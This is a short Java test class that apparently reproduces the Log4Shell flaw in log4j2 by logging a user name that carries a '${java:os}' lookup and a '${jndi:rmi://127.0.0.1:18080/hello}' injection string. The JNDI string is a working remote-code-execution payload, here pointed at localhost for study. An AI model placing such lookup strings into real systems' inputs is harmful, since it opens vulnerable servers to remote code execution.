package com.itplh.log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class TestLog4j2UseJndi {

    private static Logger logger = LogManager.getLogger("log4j2");

    public static void main(String[] args) {
        String zhangsan = "张三${java:os}";
        logger.info("[{}]上线了", () -> zhangsan);

        String lisi = "李四${jndi:rmi://127.0.0.1:18080/hello}";
        logger.info("[{}]上线了", () -> lisi);
    }

}
